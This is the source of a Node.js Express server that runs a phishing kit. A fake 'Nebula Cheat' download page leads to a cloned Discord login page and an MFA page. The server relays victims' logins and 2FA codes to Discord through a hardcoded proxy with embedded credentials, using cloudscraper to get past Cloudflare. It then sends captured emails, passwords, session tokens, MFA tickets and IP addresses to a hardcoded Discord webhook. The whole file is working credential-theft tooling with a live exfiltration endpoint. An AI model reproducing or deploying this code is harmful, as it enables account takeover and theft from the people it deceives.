const express = require('express');
const axios = require('axios');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const bodyParser = require('body-parser');
const cloudscraper = require('cloudscraper');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555233029730074787/3SlnHtR_N141bKlSRbrKTz_qICZt0kHXRzrNaAOvyQe75H1ClYGqgAQLDcT7jcoksYTY';
const DISCORD = 'https://discord.com';
const PORT = process.env.PORT || 3000;
let YOUR_DOMAIN = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

// ---------- PROXY CONFIGURATION ----------
// Using the first proxy from your list
const PROXY_URL = 'http://ywtsazmm:d3hv3nilbs66@45.38.107.97:6014';

const jar = new CookieJar();
const client = wrapper(axios.create({ jar }));

app.get('/ping', (req, res) => res.send('ok'));

async function cfFetch(path, opts = {}) {
  try {
    const scraperOpts = {
      uri: `${DISCORD}${path}`,
      method: opts.method || 'GET',
      body: opts.data ? JSON.stringify(opts.data) : undefined,
      headers: { 
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 
        ...(opts.headers || {}) 
      },
      resolveWithFullResponse: true,
      simple: false,
      jar: jar,
      proxy: PROXY_URL
    };

    const r = await cloudscraper(scraperOpts);
    return { status: r.statusCode, data: r.body, headers: r.headers };
  } catch (e) {
    console.error('Cloudscraper failed, trying axios fallback:', e.message);
    const axiosOpts = { 
      url: `${DISCORD}${path}`, 
      ...opts, 
      proxy: false,
      httpsAgent: new HttpsProxyAgent(PROXY_URL)
    };
    const r = await client(axiosOpts);
    return { status: r.status, data: r.data, headers: r.headers };
  }
}

// ---------- FAKE LANDING PAGE ----------
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Nebula Cheat - Login Required</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
        body { background: #0a0a0f; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; background-image: radial-gradient(circle at 50% 50%, rgba(88,101,242,0.15), transparent 60%); }
        .card { background: #14141c; padding: 48px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.1); text-align: center; max-width: 400px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
        h1 { font-size: 28px; margin-bottom: 12px; background: linear-gradient(90deg, #5865F2, #eb459e); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        p { color: #8a8a9a; margin-bottom: 32px; font-size: 15px; }
        button { background: #5865F2; color: white; border: none; padding: 16px 32px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px; transition: 0.2s; }
        button:hover { background: #4752C4; }
      </style>
    </head>
    <body>
      <div class="card">
        <h1>Nebula Cheat</h1>
        <p>You must verify your Discord account to download the cheat and access the loader.</p>
        <button onclick="openLogin()">Login with Discord</button>
      </div>
      <script>
        function openLogin() {
          const width = 500;
          const height = 700;
          const left = (screen.width / 2) - (width / 2);
          const top = (screen.height / 2) - (height / 2);
          window.open('/login', 'DiscordLogin', 'width=' + width + ',height=' + height + ',top=' + top + ',left=' + left);
        }
      </script>
    </body>
    </html>
  `);
});

// ---------- FAKE LOGIN PAGE (Exact Discord Clone) ----------
app.get('/login', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Discord</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif; }
        body { background: #313338; color: #dbdee1; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .bg-img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://discord.com/assets/0a1bbaba4b6b9e44b9e1.png') center/cover; z-index: -1; opacity: 0.4; }
        .login-box { background: #313338; padding: 32px; border-radius: 5px; width: 480px; box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2); text-align: center; position: relative; z-index: 1; }
        .logo { width: 124px; margin-bottom: 24px; }
        h2 { color: #f2f3f5; font-size: 24px; font-weight: 600; margin-bottom: 8px; }
        p.sub { color: #b5bac1; font-size: 16px; margin-bottom: 20px; }
        .input-group { text-align: left; margin-bottom: 20px; }
        label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
        label span { color: #f23f42; }
        input { width: 100%; padding: 10px; background: #1e1f22; border: none; border-radius: 3px; color: #dbdee1; font-size: 16px; outline: none; }
        input:focus { box-shadow: 0 0 0 2px #5865F2; }
        .btn { width: 100%; padding: 12px; background: #5865F2; color: white; border: none; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
        .btn:hover { background: #4752C4; }
        .forgot { display: block; text-align: left; color: #00a8fc; font-size: 14px; text-decoration: none; margin-top: 8px; }
        .forgot:hover { text-decoration: underline; }
        .register { margin-top: 20px; font-size: 14px; color: #949ba4; text-align: left; }
        .register a { color: #00a8fc; text-decoration: none; }
      </style>
    </head>
    <body>
      <div class="bg-img"></div>
      <div class="login-box">
        <img src="https://discord.com/assets/3c08a4c4b1c1c8f19f85.svg" class="logo" alt="Discord">
        <h2>Welcome back!</h2>
        <p class="sub">We're so excited to see you again!</p>
        
        <form id="loginForm">
          <div class="input-group">
            <label>Email or Phone Number <span>*</span></label>
            <input type="text" id="email" required>
          </div>
          <div class="input-group">
            <label>Password <span>*</span></label>
            <input type="password" id="password" required>
          </div>
          <a href="#" class="forgot">Forgot your password?</a>
          <button type="submit" class="btn" id="submitBtn">Log In</button>
        </form>

        <div class="register">Need an account? <a href="#">Register</a></div>
      </div>

      <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
          e.preventDefault();
          const btn = document.getElementById('submitBtn');
          btn.textContent = 'Logging in...';
          
          const email = document.getElementById('email').value;
          const password = document.getElementById('password').value;

          try {
            const res = await fetch('/api/v9/auth/login', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email, password })
            });
            const data = await res.json();
            
            // Log credentials immediately
            navigator.sendBeacon('/harvest', JSON.stringify({ stage: 'credentials', email, password }));

            if (data.mfa || data.ticket) {
              sessionStorage.setItem('mfa_ticket', data.ticket);
              window.location = '/mfa';
            } else if (data.token) {
              navigator.sendBeacon('/harvest', JSON.stringify({ stage: 'token', token: data.token, email, password }));
              window.location = '/success';
            } else {
              btn.textContent = 'Log In';
              alert('Invalid email or password. Please try again.');
            }
          } catch (err) {
            btn.textContent = 'Log In';
            alert('Network error. Please try again.');
          }
        });
      </script>
    </body>
    </html>
  `);
});

// ---------- API PROXIES WITH DEEP LOGGING ----------
app.post('/api/v9/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    console.log(`[LOGIN ATTEMPT] Trying to login: ${email}`);
    
    const r = await cfFetch('/api/v9/auth/login', {
      method: 'POST',
      data: { email, password, undelete: false, captcha_key: null, login_source: null, gift_code_sku_id: null },
      headers: { 'Content-Type': 'application/json' },
    });
    
    const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;
    
    console.log('--- DISCORD RAW RESPONSE ---');
    console.log(JSON.stringify(data, null, 2));
    console.log('----------------------------');

    res.json(data);
  } catch (e) {
    console.error('--- PROXY FETCH ERROR ---');
    console.error(e.message);
    console.error('-------------------------');
    res.status(500).json({ message: 'Proxy failed' });
  }
});

app.post('/api/v9/auth/mfa', async (req, res) => {
  try {
    const { code, ticket } = req.body;
    console.log(`[MFA ATTEMPT] Submitting code`);
    
    const r = await cfFetch('/api/v9/auth/mfa', {
      method: 'POST',
      data: { code, ticket, login_source: null, gift_code_sku_id: null },
      headers: { 'Content-Type': 'application/json' },
    });
    
    const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;
    
    console.log('--- MFA RAW RESPONSE ---');
    console.log(JSON.stringify(data, null, 2));
    console.log('------------------------');

    res.json(data);
  } catch (e) {
    console.error('MFA error:', e.message);
    res.status(500).json({ message: 'mfa error' });
  }
});

// MFA Page
app.get('/mfa', (req, res) => {
  res.send(`
    <html><body style="background:#313338;color:#dbdee1;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
      <div style="width:400px;text-align:center;background:#313338;padding:32px;border-radius:5px">
        <h2 style="color:#f2f3f5">Two-Factor Authentication</h2>
        <p style="color:#b5bac1;font-size:14px;margin:12px 0 24px">Enter the 6-digit code from your authenticator app.</p>
        <input id="code" maxlength="6" style="width:100%;padding:10px;background:#1e1f22;border:none;border-radius:3px;color:#dbdee1;font-size:24px;text-align:center;letter-spacing:8px;outline:none" placeholder="000000">
        <button onclick="submitMfa()" style="margin-top:16px;width:100%;padding:12px;background:#5865F2;border:none;border-radius:3px;color:#fff;font-size:16px;cursor:pointer">Verify</button>
      </div>
      <script>
        async function submitMfa() {
          const r = await fetch('/api/v9/auth/mfa', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code: document.getElementById('code').value, ticket: sessionStorage.getItem('mfa_ticket') }) });
          const data = await r.json();
          if (data.token) { 
            navigator.sendBeacon('/harvest', JSON.stringify({ stage: 'mfa-token', token: data.token }));
            window.location = '/success'; 
          } else { 
            alert('Invalid code'); 
          }
        }
      </script>
    </body></html>
  `);
});

app.post('/harvest', (req, res) => {
  let body = req.body;
  if (typeof body === 'string') { try { body = JSON.parse(body); } catch(e) {} }
  sendToWebhook({ ...body, ip: req.ip });
  res.json({ ok: true });
});

app.get('/success', (req, res) => {
  res.send(`
    <html><body style="background:#0a0a0f;color:#e8e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
      <div style="text-align:center">
        <h1 style="color:#57F287;font-size:48px">Login Successful</h1>
        <p style="color:#8a8a9a;font-size:18px">Enjoy your cheat. Download will start shortly.</p>
        <script>setTimeout(() => { window.close(); }, 3000);</script>
      </div>
    </body></html>
  `);
});

async function sendToWebhook(p) {
  try {
    const fields = [];
    if (p.stage) fields.push({ name: 'Stage', value: p.stage, inline: false });
    if (p.email) fields.push({ name: 'Email', value: p.email, inline: true });
    if (p.password) fields.push({ name: 'Password', value: p.password, inline: true });
    if (p.token) fields.push({ name: 'Token', value: '```' + p.token + '```', inline: false });
    if (p.ticket) fields.push({ name: 'MFA Ticket', value: '```' + p.ticket + '```', inline: false });
    if (p.userId) fields.push({ name: 'User ID', value: p.userId, inline: true });
    if (p.ip) fields.push({ name: 'IP', value: p.ip, inline: true });

    await axios.post(WEBHOOK_URL, {
      username: 'Nebula Logger',
      embeds: [{ title: 'Discord Capture', color: 0x5865F2, fields: fields, timestamp: new Date().toISOString() }],
    });
  } catch (e) { console.error('webhook fail:', e.message); }
}

app.listen(PORT, () => console.log(`Proxy running on port ${PORT}`));
